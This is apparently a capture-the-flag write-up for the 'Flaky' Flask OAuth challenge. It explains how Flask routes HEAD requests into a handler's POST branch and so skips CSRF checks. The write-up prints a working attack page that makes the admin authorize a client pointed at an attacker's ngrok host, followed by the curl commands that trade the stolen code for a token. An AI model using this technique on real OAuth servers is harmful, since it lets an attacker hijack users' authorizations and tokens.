Flaky is a web app written in Flask, that implements an OAuth server.
We can create an account, and after logging in, we can create OAuth clients. We can also send a URL for admin to see.

 Quick glance into `routes.py` file, and we see this function:

```python
@bp.route('/api/flag')
@require_oauth('flag')
def api_flag():
    user = current_token.user
    if user.username == ADMIN:
        return FLAG
    return 'chCTF{no flag for you} (no, seriously, this is not the flag)'
```

This means that we need to make admin give us permission for `flag`. How do we authorize client for a user? This is done by filling the form at `/oauth/authorize` form. This is analogous to all the "login with" flows that are widely-seen on the internet -- first you log in, then click a button that confirms you authorize the app to do sth. The button itself is a self contained form with CSRF token attached. This means, that we cannot click it by ourselves with simple `fetch` request, because that results in a 500 Bad Request. There's a subtle bug though. CSRF token is validated for POST requests, but isn't for GET requests. So far so good. The code for the route is basically

```python
@bp.route('/oauth/authorize', methods=['GET', 'POST'])
def authorize():
if request.method == 'GET':
    # ... display the authorization form
else:
    # process the form
```

It tourns out, that for `HEAD` requests, `flask` router treats them the same as `GET`, so that the support for them is less burdensome - the route is evaluated, but only the content length is transfered, not data.
Inside the method however, `request.method == 'HEAD'`. `HEAD` doesn't qualify for CSRF checks. This means, that the `else` clause can actually be reached with a `HEAD` request not guarded by CSRF.

I created a client like this:

```
Client Info
  client_id: M2ILFb7upkWxbSS6CZvQ3kro
  client_secret: EDbum3EF5x8LfpVlbQMfQWFzsoFyteaMs4xyiFx6kbetBlQL
  client_id_issued_at: 1595525394
  client_secret_expires_at: 0
Client Metadata
  client_name: aaaa
  client_uri: http://fe0ca3c5fbbc.ngrok.io
  grant_types: ['authorization_code']
  redirect_uris: ['http://fe0ca3c5fbbc.ngrok.io']
  response_types: ['code']
  scope: flag
  token_endpoint_auth_method: client_secret_post
```

With this info, I made following webpage and send the link to the admin:

```html
<script>
    const CLIENT_ID = 'M2ILFb7upkWxbSS6CZvQ3kro';
    const STATE = '111111111111111111111111111111'; // any string of this length
    const url = `http://localhost:8000/oauth/authorize?response_type=code&client_id=${CLIENT_ID}&scope=flag&state=${STATE}`;
    fetch(url, { method: 'HEAD', credentials: 'include', mode: 'no-cors'})
</script>
```

After a while, I got a request:
```
127.0.0.1 - - [23/Jul/2020 20:01:59] "HEAD /?code=enOxpNniZLo6aBtrG1icDqKjXXhNn0vzxaAW2PLoh4TmS0nd&state=111111111111111111111111111111 HTTP/1.1" 200 -
```
From this code, we can obtain authorization token:

```
$ curl -XPOST https://flaky.chujowyc.tf/oauth/token -F client_id=M2ILFb7upkWxbSS6CZvQ3kro -F client_secret=EDbum3EF5x8LfpVlbQMfQWFzsoFyteaMs4xyiFx6kbetBlQL -F grant_type=authorization_code -F scope=flag -F code=enOxpNniZLo6aBtrG1icDqKjXXhNn0vzxaAW2PLoh4TmS0nd
{"access_token": "2NNmqLHIbulPINiDjIom2HnYjdKw6wErMJiCt1NbdM", "expires_in": 864000, "scope": "flag", "token_type": "Bearer"}
```

and get the flag:
```
$ curl -H 'Authorization: Bearer 2NNmqLHIbulPINiDjIom2HnYjdKw6wErMJiCt1NbdM' 'https://flaky.chujowyc.tf/api/flag'
chCTF{tHiS_c0St_G1tHub_25K_buc4s}
```
